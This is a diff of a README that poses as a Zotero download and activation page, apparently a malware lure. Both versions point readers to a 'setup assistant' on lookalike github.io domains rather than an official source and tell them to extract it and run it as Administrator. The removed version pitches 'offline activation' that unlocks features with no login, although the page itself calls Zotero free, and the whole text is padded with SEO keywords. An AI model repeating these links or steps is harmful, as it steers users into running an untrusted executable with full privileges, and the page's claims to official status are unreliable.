@@ -1,27 +1,64 @@
-# Zotero — Offline Activation Guide
-🔘 Download Button
+# Zotero — Download Free for Windows
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://zotero-desktop.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://zotero-download.github.io/.github/)
+[![Get Zotero](https://img.shields.io/badge/Get-Zotero-success?style=for-the-badge)](https://zotero-download.github.io/.github/)
+[![Start Download](https://img.shields.io/badge/Start-Download-informational?style=for-the-badge)](https://zotero-download.github.io/.github/)
 
-⚙️ How to Use
+---
+
+## ⚙️ How to Use Zotero
+
 1. Download the setup assistant using the button above  
 2. Extract the archive using 7-Zip or WinRAR  
 3. Run the included tool as Administrator  
 4. Follow the on-screen instructions  
-5. Launch Zotero — all features should now be available
+5. Launch Zotero — all features should now be available  
 
-🎯 What You Unlock
+---
 
-    🔓 Full export settings
+## 🎯 What You Get
 
-    🎨 Professional tools and UI access
+✅ 📚 **Reference Management**  
+Organize your books, articles, websites, and other research materials in one place.
 
-    🔈 Reference management and citation features enabled
+✅ 🔗 **Browser Integration**  
+Save references from Chrome, Firefox, and Edge with a single click.
 
-    🔌 Plugin support, integration with third-party software
+✅ ☁️ **Cloud Sync**  
+Access your entire Zotero library across multiple devices.
 
-    🛠 No login or online validation required
+✅ 🧠 **Smart Collections**  
+Automatically categorize research with powerful tagging and search tools.
 
+✅ 📝 **Citation Generator**  
+Insert citations and bibliographies in Word, LibreOffice, or Google Docs.
+
+✅ 🔄 **Import/Export Tools**  
+Supports BibTeX, RIS, EndNote XML, and more for easy migration and sharing.
+
+---
+
+## 💡 About Zotero
+
+Zotero is a free, open-source reference manager designed to help researchers, academics, and students collect, organize, and cite sources efficiently. With powerful features like browser integration and cloud syncing, Zotero streamlines every aspect of the research process.
+
+Whether you're writing a thesis, managing collaborative academic work, or compiling a literature review, Zotero allows you to focus on content while handling all the technicalities of formatting and organization. The user-friendly interface, paired with deep customization, makes it an essential tool for anyone involved in serious research.
+
+Zotero supports a vast range of citation styles, including APA, MLA, Chicago, and more. With its powerful plug-ins and integration into Microsoft Word, Google Docs, and LibreOffice, citing sources becomes effortless.
+
+One of the standout advantages of Zotero is its ability to automatically detect and capture metadata from scholarly articles, library catalogs, and web pages. This means you spend less time on manual entry and more time doing actual research.
+
+---
+
+## 🌟 Why Choose Zotero?
+
+- 🎓 Trusted by thousands of researchers and universities worldwide  
+- 🚫 No ads, no subscriptions — completely free to use  
+- 💻 Cross-platform support for Windows, macOS, and Linux  
+- 🔄 Sync your library seamlessly across devices  
+- 🔒 Secure data handling and privacy-focused  
+
+---
 ## About Zotero
 
 Zotero is a powerful open-source reference management software that helps researchers collect, organize, cite, and share research materials. Whether you are a student or a professional researcher, Zotero allows you to manage your research with ease, offering tools to store your references and integrate them into various writing tools like Word or Google Docs.
@@ -39,6 +76,6 @@ Zotero not only helps you collect references and organize them into libraries, b
 
 ---
 
-🔍 SEO Keywords
+##🔍 Tags
 
-zotero, zotero com, zotero desktop, zotero offline activation, zotero app, zotero download, zotero free, zotero for windows, zotero vs mendeley, zotero vs endnote, zotero citation, zotero tutorial, how to use zotero, zotero reference management, zotero bibliography, zotero research, zotero pdf annotation, zotero library, zotero pricing, zotero alternatives, zotero for students, zotero academic writing, zotero integrations, zotero chrome extension, zotero setup, zotero desktop, zotero review, best zotero features, zotero note taking
+zotero, zotero desktop, zotero free, zotero software ,zotero download, zotero software download, zotero citation software, zotero extension, zotero app
